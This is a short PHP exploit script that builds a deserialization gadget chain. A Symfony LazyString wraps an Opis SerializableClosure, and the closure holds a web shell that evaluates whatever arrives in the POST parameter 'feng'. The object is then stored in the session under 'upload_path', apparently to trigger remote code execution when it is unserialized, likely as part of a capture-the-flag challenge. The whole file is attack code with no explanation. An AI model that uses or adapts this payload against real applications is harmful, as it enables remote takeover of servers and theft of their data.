<?php


namespace Symfony\Component\String{

    use Opis\Closure\SerializableClosure;

    class LazyString{
        private $value;
        public function __construct(){
            $this->value = new SerializableClosure();
        }
    }
}
namespace Opis\Closure{
    class SerializableClosure{
        protected $closure;
        public function __construct(){
            $this->closure = function (){
                eval($_POST['feng']);
            };
        }
    }
}
namespace {

    use Symfony\Component\String\LazyString;

    $a= new LazyString();
    $_SESSION["upload_path"] = $a;
}